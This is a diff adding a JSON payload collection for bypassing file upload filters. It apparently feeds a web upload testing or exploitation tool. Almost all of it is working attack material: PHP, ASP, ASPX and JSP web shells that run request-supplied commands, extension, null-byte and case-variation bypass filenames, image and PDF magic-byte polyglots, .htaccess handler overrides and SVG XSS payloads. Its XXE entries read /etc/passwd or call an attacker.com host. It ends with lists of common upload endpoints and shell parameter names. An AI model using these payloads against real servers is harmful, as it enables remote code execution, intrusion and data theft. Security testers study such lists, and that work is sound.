@@ -1,0 +1,129 @@
+{
+  "info": {
+    "name": "File Upload Bypass Payloads",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "Comprehensive file upload bypass payloads for web shell execution, MIME type bypass, and extension manipulation. 2026 updated.",
+    "category": "Upload",
+    "severity": "CRITICAL",
+    "owasp": "A01:2021 - Broken Access Control"
+  },
+  "payloads": {
+    "double_extension": [
+      {"filename": "shell.php.jpg", "content": "<?php system($_GET['cmd']); ?>", "mime": "image/jpeg", "description": "PHP in JPG extension"},
+      {"filename": "shell.php.png", "content": "<?php system($_GET['cmd']); ?>", "mime": "image/png", "description": "PHP in PNG extension"},
+      {"filename": "shell.php5", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/octet-stream", "description": "PHP5 extension"},
+      {"filename": "shell.php7", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/octet-stream", "description": "PHP7 extension"},
+      {"filename": "shell.phtml", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/octet-stream", "description": "PHTML extension"},
+      {"filename": "shell.phar", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/octet-stream", "description": "PHAR archive"},
+      {"filename": "shell.phpt", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/octet-stream", "description": "PHPT test file"},
+      {"filename": "shell.php.gif", "content": "GIF87a\r\n<?php system($_GET['cmd']); ?>", "mime": "image/gif", "description": "GIF magic bytes + PHP"},
+      {"filename": "shell.php.jpg", "content": "\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>", "mime": "image/jpeg", "description": "PNG magic bytes + PHP"},
+      {"filename": "shell.jsp.jpg", "content": "<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>", "mime": "image/jpeg", "description": "JSP in JPG extension"}
+    ],
+    "case_variation": [
+      {"filename": "shell.PhP", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/octet-stream", "description": "Mixed case PHP"},
+      {"filename": "shell.PHP", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/octet-stream", "description": "Uppercase PHP"},
+      {"filename": "shell.phP", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/octet-stream", "description": "Mixed case variant"},
+      {"filename": "shell.ASP", "content": "<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>", "mime": "application/octet-stream", "description": "Uppercase ASP"},
+      {"filename": "shell.Asp", "content": "<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>", "mime": "application/octet-stream", "description": "Mixed case ASP"},
+      {"filename": "shell.JSP", "content": "<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>", "mime": "application/octet-stream", "description": "Uppercase JSP"}
+    ],
+    "null_byte_injection": [
+      {"filename": "shell.php%00.jpg", "content": "<?php system($_GET['cmd']); ?>", "mime": "image/jpeg", "description": "Null byte truncation"},
+      {"filename": "shell.php%00.png", "content": "<?php system($_GET['cmd']); ?>", "mime": "image/png", "description": "Null byte PNG"},
+      {"filename": "shell.php%00", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/octet-stream", "description": "Null byte extension kill"},
+      {"filename": "shell.jpg%00.php", "content": "<?php system($_GET['cmd']); ?>", "mime": "image/jpeg", "description": "Null byte in middle"},
+      {"filename": "shell.php%2500.jpg", "content": "<?php system($_GET['cmd']); ?>", "mime": "image/jpeg", "description": "Double URL encode"},
+      {"filename": "shell.php\u0000.jpg", "content": "<?php system($_GET['cmd']); ?>", "mime": "image/jpeg", "description": "Unicode null"}
+    ],
+    "magic_bytes_polyglot": [
+      {"filename": "shell.php", "content": "GIF87a\r\n<?php system($_GET['cmd']); ?>", "mime": "image/gif", "description": "GIF87a header polyglot"},
+      {"filename": "shell.php", "content": "GIF89a\r\n<?php system($_GET['cmd']); ?>", "mime": "image/gif", "description": "GIF89a header polyglot"},
+      {"filename": "shell.php", "content": "\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>", "mime": "image/png", "description": "PNG header polyglot"},
+      {"filename": "shell.php", "content": "\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>", "mime": "image/jpeg", "description": "JPEG SOI polyglot"},
+      {"filename": "shell.php", "content": "%PDF-1.4\r\n<?php system($_GET['cmd']); ?>", "mime": "application/pdf", "description": "PDF header polyglot"},
+      {"filename": "shell.php", "content": "PK\x03\x04<?php system($_GET['cmd']); ?>", "mime": "application/zip", "description": "ZIP header polyglot"}
+    ],
+    "asp_aspx_shells": [
+      {"filename": "shell.asp", "content": "<% If Request(\"cmd\")<>\"\" Then Execute(Request(\"cmd\")): End If %>", "mime": "application/octet-stream", "description": "ASP basic shell"},
+      {"filename": "shell.asp", "content": "<%@ Page Language=\"Jscript\" %><%eval(Request.Item[\"cmd\"],\"untrusted\")%>", "mime": "application/octet-stream", "description": "ASPX eval shell"},
+      {"filename": "shell.aspx", "content": "<%@ Page Language=\"C#\" %><%new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo(\"cmd\",\"/c \"+Request[\"cmd\"]){UseShellExecute=false}}.Start();%>", "mime": "application/octet-stream", "description": "ASPX cmd shell"},
+      {"filename": "shell.aspx", "content": "<%@ Page Language=\"Jscript\" validateRequest=\"false\" %><%eval(Request.Item[\"x\"])%>", "mime": "application/octet-stream", "description": "ASPX request bypass"},
+      {"filename": "shell.aspx", "content": "<script runat=\"server\">protected void Page_Load(object s, EventArgs e){Response.Write(System.Diagnostics.Process.Start(Request.QueryString[\"c\"]).StandardOutput.ReadToEnd());}</script>", "mime": "application/octet-stream", "description": "ASPX process shell"}
+    ],
+    "jsp_webshells": [
+      {"filename": "shell.jsp", "content": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "mime": "application/octet-stream", "description": "JSP basic shell"},
+      {"filename": "shell.jsp", "content": "<%@ page import=\"java.util.*,java.io.*\" %><% Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "mime": "application/octet-stream", "description": "JSP process shell"},
+      {"filename": "shell.jsp", "content": "<% Process p = Runtime.getRuntime().exec(\"cmd /c \"+request.getParameter(\"c\")); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String s; while((s=br.readLine())!=null){out.println(s);} %>", "mime": "application/octet-stream", "description": "JSP cmd shell Windows"},
+      {"filename": "shell.jsp", "content": "<% Process p = Runtime.getRuntime().exec(request.getParameter(\"c\")); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String s; while((s=br.readLine())!=null){out.println(s);} %>", "mime": "application/octet-stream", "description": "JSP cmd shell Linux"}
+    ],
+    "svg_xss_payloads": [
+      {"filename": "shell.svg", "content": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>", "mime": "image/svg+xml", "description": "SVG XSS basic"},
+      {"filename": "shell.svg", "content": "<svg><script>alert(document.cookie)</script></svg>", "mime": "image/svg+xml", "description": "SVG script injection"},
+      {"filename": "shell.svg", "content": "<svg><rect fill=\"none\" stroke=\"red\" stroke-width=\"5\" onload=\"eval(atob('YWxlcnQoMSk='))\"/></svg>", "mime": "image/svg+xml", "description": "SVG base64 eval"},
+      {"filename": "shell.svg", "content": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 400 400\"><foreignObject width=\"400\" height=\"400\"><body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script></body></foreignObject></svg>", "mime": "image/svg+xml", "description": "SVG foreignObject XSS"}
+    ],
+    "xml_xxe_payloads": [
+      {"filename": "data.xml", "content": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>", "mime": "application/xml", "description": "XXE local file read"},
+      {"filename": "data.xml", "content": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">]><r>&xxe;</r>", "mime": "application/xml", "description": "XXE SSRF"},
+      {"filename": "data.xml", "content": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>", "mime": "application/xml", "description": "XXE hostname read"}
+    ],
+    "htaccess_abuse": [
+      {"filename": ".htaccess", "content": "AddType application/x-httpd-php .jpg", "mime": "text/plain", "description": "HTaccess PHP in JPG"},
+      {"filename": ".htaccess", "content": "SetHandler application/x-httpd-php", "mime": "text/plain", "description": "HTaccess SetHandler"},
+      {"filename": ".htaccess", "content": "php_value auto_prepend_file \"shell.php\"", "mime": "text/plain", "description": "HTaccess prepend file"},
+      {"filename": ".htaccess", "content": "php_value auto_append_file \"shell.php\"", "mime": "text/plain", "description": "HTaccess append file"}
+    ],
+    "content_type_override": [
+      {"filename": "shell.jpg", "content": "<?php system($_GET['cmd']); ?>", "mime": "image/jpeg", "description": "JPEG MIME with PHP content", "override_mime": true},
+      {"filename": "shell.png", "content": "<?php system($_GET['cmd']); ?>", "mime": "image/png", "description": "PNG MIME with PHP content", "override_mime": true},
+      {"filename": "shell.gif", "content": "<?php system($_GET['cmd']); ?>", "mime": "image/gif", "description": "GIF MIME with PHP content", "override_mime": true},
+      {"filename": "shell.txt", "content": "<?php system($_GET['cmd']); ?>", "mime": "text/plain", "description": "TXT MIME with PHP content", "override_mime": true}
+    ],
+    "polyglot_files": [
+      {"filename": "shell.jpg", "content": "GIF89a<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "mime": "image/gif", "description": "GIF+XXE polyglot"},
+      {"filename": "shell.jpg", "content": "\x89PNG\r\n\x1a\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "mime": "image/png", "description": "PNG+XXE polyglot"},
+      {"filename": "shell.pdf", "content": "%PDF-1.4\r\n<?php system($_GET['cmd']); ?>", "mime": "application/pdf", "description": "PDF+PHP polyglot"}
+    ],
+    "alternative_extensions": [
+      {"filename": "shell.php3", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/octet-stream", "description": "PHP3 extension"},
+      {"filename": "shell.php4", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/octet-stream", "description": "PHP4 extension"},
+      {"filename": "shell.php8", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/octet-stream", "description": "PHP8 extension"},
+      {"filename": "shell.sphp", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/octet-stream", "description": "Reverse PHP extension"},
+      {"filename": "shell.inc", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/octet-stream", "description": "INC extension"},
+      {"filename": "shell.inc.php", "content": "<?php system($_GET['cmd']); ?>", "mime": "application/octet-stream", "description": "INC.PHP double ext"}
+    ]
+  },
+  "webshell_patterns": {
+    "php": [
+      "<?php system($_GET['cmd']); ?>",
+      "<?php echo shell_exec($_GET['cmd']); ?>",
+      "<?php eval($_POST['x']); ?>",
+      "<?php passthru($_GET['c']); ?>",
+      "<?php exec($_GET['cmd'],$o);echo implode('\\n',$o); ?>",
+      "<?php $c=$_GET['c'];system($c);?>",
+      "<?php $c=$_REQUEST['c'];eval($c);?>",
+      "<?php assert($_POST['x']); ?>"
+    ],
+    "asp": [
+      "<% eval(request(\"x\")) %>",
+      "<% Execute(request(\"x\")) %>",
+      "<% ExecuteGlobal(request(\"x\")) %>",
+      "<script language=\"vbscript\" runat=\"server\">Execute(request(\"x\"))</script>"
+    ],
+    "jsp": [
+      "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
+      "<%@ page import=\"java.io.*\" %><% Process p=Runtime.getRuntime().exec(request.getParameter(\"c\")); %>",
+      "<% Process p = Runtime.getRuntime().exec(request.getQueryString()); %>"
+    ]
+  },
+  "upload_endpoints_patterns": [
+    "upload", "upload_file", "file_upload", "import", "add_attachment",
+    "post_file", "attach", "avatar", "profile_image", "image_upload",
+    "file", "document", "media", "asset", "uploadImage", "uploadFile"
+  ],
+  "successful_execution_patterns": [
+    "cmd", "c", "command", "exec", "x", "shell", "payload"
+  ]
+}
